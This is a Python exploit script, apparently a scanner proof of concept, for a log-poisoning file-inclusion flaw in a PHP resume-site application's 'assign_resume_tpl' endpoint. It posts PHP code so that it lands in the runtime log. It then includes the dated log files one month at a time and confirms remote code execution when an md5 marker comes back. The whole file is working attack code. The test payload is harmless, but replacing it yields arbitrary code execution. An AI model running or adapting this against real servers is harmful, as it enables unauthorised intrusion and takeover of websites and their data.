import requests, re, urllib3
from hashlib import md5

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def randomInt(s, e):
    import random
    key = random.randint(int(s), int(e))
    return key


f1 = str(randomInt(1000, 2000))


def substr(strs, s, lens):
    result = strs[s:s + lens]
    return result


def doCheck(url):
    if url[-1] != "/":
        url = url + "/"
    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=%3C%3Fphp+echo+md5(" + f1 + ")%3B+ob_flush%28%29%3B%3F%3E"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 404:
        r1 = True
        try:
            day = re.findall(",\\s+(\\d*)\\s+", response.headers["Date"])[0]
        except:
            day = ''
        try:
            year = re.findall("\\s+(.{4})\\s+", response.headers["Date"])[0]
            year = substr(year, 2, 2)
        except:
            year = ''
    else:
        return False

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_01_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_02_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_03_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_04_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_05_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_06_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_07_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_08_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_09_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_10_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_11_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl

    targetUrl = url + "index.php?m=home&a=assign_resume_tpl"
    body = f"variable=1&tpl=data%2FRuntime%2FLogs%2FHome%2F{year}_12_{day}.log"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(targetUrl, body, headers=headers, timeout=5, verify=False)
    if response.status_code == 200 and md5(str(f1).encode()).hexdigest() in response.text:
        return targetUrl
    return False
